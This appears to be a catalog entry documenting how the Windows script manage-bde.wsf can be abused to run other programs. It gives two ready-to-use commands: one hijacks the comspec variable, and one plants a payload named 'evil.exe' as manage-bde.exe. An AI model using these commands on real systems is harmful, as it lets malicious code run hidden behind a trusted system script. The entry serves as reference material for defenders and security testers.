---
Name: Manage-bde.wsf
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf
    Description: Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.
  - Command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
    Description: Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
Full Path:
  - c:\windows\system32\manage-bde.wsf
Code Sample: []
Detection: []
Resources:
  - https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
  - https://twitter.com/bohops/status/980659399495741441
Notes: Thanks to Jimmy - @bophops (Comspec), Daniel Bohannon - @danielhbohannon (Path Hijack)
---